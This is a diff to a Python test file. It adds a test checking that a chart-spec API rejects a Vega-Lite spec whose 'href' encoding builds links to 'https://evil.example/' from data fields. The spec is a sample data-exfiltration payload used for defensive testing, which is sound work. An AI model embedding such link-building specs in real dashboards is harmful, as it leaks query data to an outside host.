@@ -189,6 +189,20 @@ def test_a_spec_carrying_any_url_is_refused(client, auth_headers, fake_trino):
     assert "url" in r.json()["detail"]
 
 
+def test_a_spec_carrying_href_is_refused(client, auth_headers, fake_trino):
+    spec = {
+        "mark": "bar",
+        "transform": [{"calculate": "'https://evil.example/' + datum.a", "as": "link"}],
+        "encoding": {
+            "x": {"field": "a", "type": "nominal"},
+            "href": {"field": "link", "type": "nominal"},
+        },
+    }
+    r = _create(client, auth_headers, spec=spec)
+    assert r.status_code == 400
+    assert "href" in r.json()["detail"]
+
+
 def test_a_legend_bind_object_is_refused(client, auth_headers, fake_trino):
     spec = {
         "mark": "bar",
